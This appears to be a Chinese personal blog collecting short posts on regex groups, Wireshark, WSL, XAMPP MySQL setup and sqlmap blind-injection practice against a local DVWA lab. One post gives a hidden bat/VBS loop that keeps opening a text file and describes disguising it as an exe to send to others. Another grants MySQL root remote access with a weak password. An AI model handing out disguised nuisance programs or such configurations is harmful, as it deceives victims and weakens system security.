?:分组不捕获

在正则中，有一个概念是 “捕获组” ，意思是将一个正则表达式中的子表达式捕获的内容，存储到内存中以数字编号或者显式命名的组里，前者称为普通捕获组，后者称为命名捕获组。

现在只说明普通捕获组，普通捕获组是将捕获的子表达式匹配的内容存储到以数字编号的内尺中，其中数字 0 是表示所有匹配组，这种引用可以是正则表达式内部引用，也可以是外部引用。

对捕获组的内部引用被称为 “反向引用” ，反向引用的作用通常是用来查找或限定重复、查找或限定指定标识配对出现等等。

可以在()中，添加 ?: 来使分组不被捕获，提高效率。

在正则中，每一个 () 中的正则 匹配到合适的字符时会添加到寄存器中，寄存器的名字一般会进行编号，从1开始，就是第一个 () 匹配的内容。

abcdebbcde

==================================

Full match 0-1 a
Match 2
Full match 1-2 b
Match 3
Full match 5-6 b
Match 4
Full match 6-7 b

==================================

Match 1
Full match 0-1 a

Match 2

================================

================================

Group 1. 5-6 b

wireshark启动后不显示Interface

今天在使用wireshark时，找不到Interface，才开始以为是wireshark不支持无线网卡，后来发现是需要开启npf服务。

npf服务是wincap的网络组包过滤软件的数据包捕获文件，在C:\Windows\System32\driver目录下有npf.sys文件，在开启wireshark后发现没有Interface的话，可以试试开启npf服务，命令：

net start npf

问题结局。

windows10下使用linux(非虚拟机)

在今年的 Build 2016 上，微软向全世界介绍了他们还处于 Beta 阶段的 Windows 下的 Linux 子系统（WSL），它可以让开发者们在 Windows 10 下通过 Bash shell 运行原生的 Ubuntu 用户态二进制程序。如果你参与了 Windows Insider 计划，你就可以在最新的 Windows 10 年度升级版的 Insider 构建版中体验这个功能了。

小玩意儿

今天想给别人的电脑搞点破坏，想法是让电脑不断的在txt文档中输出Boom!!字样，而且让文件自启。

首先，写一个run.bat文件，代码如下：

@echo off
:a                                //使用goto循环
echo Boom!! >> run.txt
run.txt
if not exist E:\close.txt goto :a   //算是个后门吧，还没有想起别的结束方法来

同时在bat文件下面新建文件run.txt ,此时出现的问题是运行bat文件时，出现cmd窗口，这样就没意思了，找了一些解决办法，一般是用vbs文件，来运行bat文件就行，解决方法：

在bat文件下新建run.vbs文件 ，代码如下：

set ws=wscript.createobject("wscript.shell")
ws.run "run.bat /start",0       //这里的run.bat就是上面的bat文件

点击run.vbs，运行成功，一直弹出txt文档，而且不断往文档中写Boom!!，现在想要发给别人，让别人也来体会一下关不掉txt文档的感受。。哈哈哈

才开始想到的方法是运行exe的同时，运行run.vbs，可是不知道怎么弄exe，感觉挺麻烦的，在网上查了一些方法，看到了使用文件夹的autorun.inf文件（后来试了试怎么都不成功，才知道这个文件时用在光盘或者U盘上面的，之前还曾经是个漏洞广为流传，当我在U盘试验时，360直接报毒，将autorun.inf删掉了0.0），但没有成功，最后发现winrar有个功能，可以选择解压完成后运行什么程序，直接生成exe文件

过程见截图咯~~

最后这个就是给生成的exe文件添加一个图标，要不然一下就会看出是rar

这是成果，诸位可以尽情一试，可能会出现上面的情况，但是不会给电脑带来任何危害！

run.exe

最后生成一个exe文件，这样直接发给别人的话，就可以完美的起到效果了！

xampp添加&修改mysql用户密码+设置远程连接

初始建站，选择了xampp这个方便简洁的环境工具，当时是为了练习渗透能力，就搭建DVWA环境，那时候，一些搭建DVWA的教程在设置mysql方面并没有详细说明，在DVWA初始化，创建数据库时，因为总是提示“no connection”，一般的解决办法是将DVWA的配置文件config.inc.php中的password设为空即可，但是今天，想尝试一些远程连接数据库，却因为没有密码，遇到了问题。

现在来分享一下刚才尝试的过程：

首先是添加或者修改mysql密码

1.进入xampp路径下的mysql路径

cd xmapp\mysql

2.然后用空密码方式使用root用户登录 MySQL

mysql -u root;

3.修改root用户的密码

mysql>update mysql.user set Password=password('123456') where User='root';
mysql>flush privileges;

4.重启mysql服务

ps:修改了密码后，相应的也要修改DVWA和phpadmin的密码，

DVWA配置文件路径：xampp\htdocs\DVWA\config\config.inc.php，将里面的password改为刚才你修改的密码即可

phpmyadmin配置文件路径：\xampp\phpMyAdmin\config.inc.php，将里面的password修改为刚才的密码

$cfg[‘Servers’][$i][‘auth_type’] = ‘config’;

$cfg[‘Servers’][$i][‘user’] = ‘root’;

$cfg[‘Servers’][$i][‘password’] = ‘123456’;

$cfg[‘Servers’][$i][‘extension’] = ‘mysql’;

$cfg[‘Servers’][$i][‘AllowNoPassword’] = true;

接下来是设置mysql远程连接

1.进入xampp路径下的mysql路径

cd xmapp\mysql

2.授予权限

grant all privileges on *.* to 'root'@'%' idetified by '123456' with grant option;

参数解释：

all privileges ： 授予除了grant option 之外的所有权限

identified by ‘123456’： 设置连接密码

with grant option ： 这个具体还不知道，大概就是具备授予权限的权利

GRANT基本的权限赋予语法

GRANT 权限类型1 [(要赋予的对象，列列表)][， 权限类型2[(要赋予的对象，列列表)]]...  ON [对象类型] 权限级别 TO 用户1 IDENTIFIED BY '密码' [, 用户2 IDENTIFIED BY '密码' ]...

3.重启mysql服务，就可以进行远程登陆了

删除权限

REVOKE基本的权限收回语法：

REVOKE 权限类型1[(回收权限的列对象列表)], 权限类型2[(要回收权限的列对象列表)]... ON [对象类型] 权限级别 FROM 要回收权限的用户1 [,要回收权限的用户2]..

基本和grant相同，主要是 to 换成 from

用sqlmap进行盲注测试

今天来试试sql的盲注测试，不是手工，而是用sqlmap这个神器。

关于传统sql注入和sql盲注的区别，目前我只知道盲注是sql注入的一种，盲注是在渗透者不知情的情况下对网站数据库数据进行不断猜测的注入。

sqlmap支持五种不同的注入模式：

1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。

2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。

3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。>

4、联合查询注入，可以使用union的情况下的注入。

5、堆查询注入，可以同时执行多条语句的执行时的注入。

今天还是以DVWA来作为测试环境

首先，将DVWA等级调为low，然后进入sql注入页面，通过一些小测试发现存在sql注入漏洞，接下来准备直接用sqlmap进行注入。

sqlmap.py -r headers.txt --cookie="security=low; PHPSESSID=p8hgdmvsrtuagjkuprfg8pjle7"

这里的headers.txt文件是抓取的访问sql注入页面的请求头文件

参数解释：

-r：sqlmap可以从一个文本文件中获取HTTP请求，这样就可以跳过设置一些其他参数（比如cookie，POST数据，等等）。当请求是HTTPS的时候你需要配合这个–force-ssl参数来使用，或者你可以在Host头后面加上:443。

–cookie : DVWA如果不加上cookie就会302跳转

之后sqlmap界面会出现一系列测试的条目，其中有一些需要我们注意

下面是sqlmap尝试的一些注入点

sqlmap发现id参数存在error-based、time-based blind、UNION query三种注入漏洞，现在我们来试试第一个，通过–technique选线实现，如下列表中是该选项的参数。

B : 基于Boolean的盲注（Boolean based blind）

Q : 内联查询（Inline queries）

T : 基于时间的盲注（time based blind）

U : 基于联合查询（Union query based）

E : 基于错误（error based）

S : 栈查询（stack queries）

构造命令：

sqlmap.py -r headers.txt --cookie="security=low; PHPSESSID=p8hgdmvsrtuagjkuprfg8pjle7" --technique B -p id --current-user

参数解释：
–current-user ： 强制SQLmap查询并显示登录MYSQL数据库系统的当前用户。

参数解释：

–string ：
默认情况下sqlmap通过判断返回页面的不同来判断真假，但有时候这会产生误差，因为有的页面在每次刷新的时候都会返回不同的代码，比如页面当中包含一个动态的广告或者其他内容，这会导致sqlmap的误判。此时用户可以提供一个字符串或者一段正则匹配，在原始页面与真条件下的页面都存在的字符串，而错误页面中不存在（使用–string参数添加字符串，–regexp添加正则），同时用户可以提供一段字符串在原始页面与真条件下的页面都不存在的字符串，而错误页面中存在的字符串（–not-string添加）。用户也可以提供真与假条件返回的HTTP状态码不一样来注入，例如，响应200的时候为真，响应401的时候为假，可以添加参数–code=200。
